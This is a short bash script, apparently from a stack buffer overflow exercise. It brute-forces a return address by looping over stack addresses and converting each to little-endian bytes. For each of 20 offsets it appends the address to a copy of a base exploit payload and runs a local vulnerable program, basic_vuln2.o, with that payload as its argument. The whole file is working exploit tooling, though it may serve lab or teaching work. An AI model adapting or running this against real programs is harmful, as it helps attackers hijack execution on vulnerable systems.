#!/bin/bash

# Set the start and end hexadecimal addresses
start_hex="0xBFFFF7D0"
end_hex="0xBFFFF7D1"

# Convert start and end hexadecimal addresses to decimal
start_dec=$(printf "%d" "$start_hex")
end_dec=$(printf "%d" "$end_hex")

# Loop through each address from start to end (in decimal)
for ((addr=$start_dec; addr<=$end_dec; addr++)); do
    # Convert the current decimal address back to hexadecimal format
    addr_hex=$(printf "0x%x" "$addr")
    
    # Print the current hexadecimal address for debugging
    echo $addr_hex

    # Generate the filename for the exploit file based on the current address
    exploit_file="final-exploit-$(printf '%08X' $addr)"
    
    # Copy the base exploit file to a new file for the current address
    cp exploit $exploit_file

    # Extract each byte of the address in reverse order
    byte1=$(printf "%02x" $((($addr_hex >> 24) & 0xFF)))  # First byte (most significant)
    byte2=$(printf "%02x" $((($addr_hex >> 16) & 0xFF)))  # Second byte
    byte3=$(printf "%02x" $((($addr_hex >> 8) & 0xFF)))   # Third byte
    byte4=$(printf "%02x" $(($addr_hex & 0xFF)))          # Fourth byte (least significant)

    # Combine the bytes into the format needed for the exploit (little-endian format)
    formatted_addr="\\x$byte4\\x$byte3\\x$byte2\\x$byte1"

    # Loop through 20 word offsets and append the formatted address to the exploit file
    for i in $(seq 1 20); do
        # Print the current word offset and address being tested
        printf "\n Word offset [$i] with address $addr_hex result: "
        
        # Use Perl to insert the formatted address into the exploit file
        perl -e "print \"$formatted_addr\"" >> $exploit_file

        # Execute the vulnerable program with the generated exploit file
        ./basic_vuln2.o `cat $exploit_file`
    done

    # Remove the exploit file after processing to save space
    rm $exploit_file
done
